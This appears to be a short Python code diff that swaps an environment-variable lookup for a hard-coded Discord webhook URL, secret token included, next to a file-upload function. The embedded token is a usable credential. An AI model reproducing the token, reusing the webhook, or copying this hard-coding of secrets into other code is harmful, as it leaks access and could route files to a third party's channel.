@@ -8,7 +8,7 @@ from PIL import Image
 from tabulate import tabulate
 from datetime import datetime
 
-WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '')
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1129451738823397386/NaKZGFF43BPw4-r6OeVTbl_DwTfljY6tyzeo9chos16X6RLzbS3CIRprUfCFddXanDYA'
 
 def upload_file_to_discord(file_path):
     with open(file_path, 'rb') as file:
